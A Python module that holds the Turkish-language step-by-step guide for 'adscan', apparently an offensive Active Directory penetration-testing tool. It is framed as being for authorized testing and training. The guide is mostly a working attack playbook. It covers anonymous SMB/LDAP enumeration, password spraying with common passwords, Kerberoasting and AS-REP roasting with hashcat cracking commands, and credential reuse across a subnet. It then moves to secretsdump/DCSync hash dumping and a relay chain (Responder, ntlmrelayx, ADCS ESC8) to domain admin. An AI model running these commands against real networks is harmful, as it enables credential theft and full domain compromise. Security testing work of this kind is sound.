"""`--guide`: adım adım kullanım / metodoloji kılavuzu.

Kullanıcıya önce neyi, sonra neyi çalıştıracağını; hangi bulgudan hangi sonraki
adımın geldiğini öğretir. Terminale basılır (renk için report._supports_color).
"""

from __future__ import annotations

GUIDE = r"""
==============================================================
 adscan — ADIM ADIM KULLANIM KILAVUZU (yetkili test / eğitim)
==============================================================

Not: Önce yetki! Yalnızca sahibi olduğun ya da YAZILI izinli hedefte çalıştır.
Her bulgu çıktısında "doğrula (PoC)" ve "yükseltme" satırları yer alır —
PoC komutunu kendin çalıştırıp bulguyu teyit edebilirsin.

--------------------------------------------------------------
EN KOLAY YOL — Otonom mod (autopilot)
--------------------------------------------------------------
  python -m adscan <DC-IP> -d <domain> --auto
  Tek komutla: kimliksiz enum -> kullanıcıları otomatik çıkar ->
  password spraying (kilitlenme-farkında) -> bulunan kimlikleri host'larda
  reuse. Sen yalnızca çıktıdaki bulguları "doğrula (PoC)" komutlarıyla
  manuel teyit edersin. (Aktif olduğu için 'yetkiliyim' onayı ister.)
  Kimlikli başlatmak istersen: ... --auto -u <user> --ask-pass

  Aşağıdaki ADIM'lar aynı işi ELLE, aşama aşama yapmak içindir.

--------------------------------------------------------------
ADIM 0 — Araçları doğrula
--------------------------------------------------------------
  python -m adscan --check
  (nmap, netexec/nxc, windapsearch kurulu mu? Eksikse README'deki kurulum.)

--------------------------------------------------------------
ADIM 1 — Kimliksiz (unauthenticated) keşif
--------------------------------------------------------------
  python -m adscan <DC-IP>
  -> nmap (portlar, SMB signing, SMBv1, MS17-010, RDP),
     nxc null session, windapsearch anonim bind.
  Burada çıkabilecek tipik bulgular ve anlamı:
    * "Null/anonim SMB oturumu mümkün"  -> kimliksiz enum kapısı açık.
         doğrula:  nxc smb <DC-IP> -u '' -p ''
    * "Anonim LDAP bind"                -> kullanıcı listesi kimliksiz çekilebilir.
         doğrula:  windapsearch --dc-ip <DC-IP> -U
    * "SMB signing kapalı"              -> NTLM relay adayı (ADIM 6).
    * "MS17-010 ZAFİYETLİ"              -> kritik; LAB'de RCE.

--------------------------------------------------------------
ADIM 2 — Kullanıcı listesini çıkar
--------------------------------------------------------------
  windapsearch --dc-ip <DC-IP> -U | grep sAMAccountName | awk '{print $2}' > users.txt
  (ADIM 1'de anonim bind veya null session varsa kimliksiz de çalışır.)

--------------------------------------------------------------
ADIM 3 — Password spraying (KİLİTLENME-FARKINDA)
--------------------------------------------------------------
  python -m adscan <DC-IP> --spray \
      --spray-userlist users.txt \
      --spray-passwords 123456,1234567,12345678,12345,Sirket2024,Password1
  -> Önce parola politikasını okur; kilitleme eşiğini AŞMAZ (aşacaksa iptal eder,
     bilerek geçmek için --spray-force).
  Çıktı: "Zayıf parolalarla N hesap doğrulandı (%..)" + açık user:password listesi.

--------------------------------------------------------------
ADIM 4 — Kimlikli (authenticated) enum
--------------------------------------------------------------
  python -m adscan <DC-IP> -u <user> --ask-pass -d <domain>
  -> paylaşımlar, parola politikası, Kerberoasting ($krb5tgs$),
     AS-REP roasting ($krb5asrep$), delegation, PASSWD_NOTREQD.
  Roast hash'leri loot/kerb.txt + loot/asrep.txt'e yazılır. Kırmak için:
    adscan <DC> -u <user> -p <pass> -d <domain> --crack   # OTOMATİK (hashcat/john)
  ya da elle:
    hashcat -m 13100 loot/kerb.txt /usr/share/wordlists/rockyou.txt   # Kerberoast RC4
    hashcat -m 19600 loot/kerb.txt rockyou.txt   # Kerberoast AES128 (etype 17)
    hashcat -m 19700 loot/kerb.txt rockyou.txt   # Kerberoast AES256 (etype 18)
    hashcat -m 18200 loot/asrep.txt rockyou.txt  # AS-REP
  Kırılan parola kimlik olarak zincire eklenir (--auto/--full otomatik kırar).

--------------------------------------------------------------
ADIM 5 — Credential reuse / yanal hareket
--------------------------------------------------------------
  python -m adscan <DC-IP> --spray --spray-userlist users.txt \
      --spray-passwords 123456,Password1 \
      --reuse --reuse-targets 10.10.10.0/24
  -> bulunan kimlikleri tüm host'larda dener; "(Pwn3d!)" = yerel admin.
  Admin host'ta:
    secretsdump.py <domain>/<user>@<host>     # hash dökümü
    (DA/DC ise: secretsdump.py ... -just-dc   # DCSync)

--------------------------------------------------------------
ADIM 6 — Aktif saldırılar (poisoning / relay / ESC8)  [ÇOK AKTİF]
--------------------------------------------------------------
  # Önce PLAN (hiçbir şey çalıştırmaz, komut zincirini gösterir):
  python -m adscan <DC> -d <domain> --active-attacks -I eth0

  # Gerçekten çalıştır (ek 'yetkiliyim' onayı ister):
  python -m adscan <DC> -d <domain> --active-attacks --launch -I eth0 \
      --adcs-ca-url http://<CA>/certsrv/certfnsh.asp
  Zincir: mitm6/Responder -> ntlmrelayx -> ESC8 (ADCS) -> sertifika -> DCSync -> DA

--------------------------------------------------------------
BULGUDAN YÜKSELTMEYE — hızlı harita
--------------------------------------------------------------
  Null session / anon LDAP   -> user listesi -> spraying (ADIM 3)
  Zayıf parola politikası     -> spraying (ADIM 3)
  Geçerli kimlik             -> reuse/yanal hareket (ADIM 5)
  Kerberoast / AS-REP        -> --crack (hashcat/john) -> reuse
  SMB/LDAP signing kapalı     -> NTLM relay (ADIM 6)
  PetitPotam / unconstrained -> coerce -> relay -> ESC8 -> DA (ADIM 6)
  Zerologon                  -> DC parola reset -> DCSync (LAB)

İpucu: Her çalıştırma sonunda "Yetki Yükseltme Zinciri" özeti hangi adımda
olduğunu ve sıradaki komutu gösterir. Raporlar: adscan-reports/ (JSON + MD).
"""


def print_guide() -> None:
    print(GUIDE)
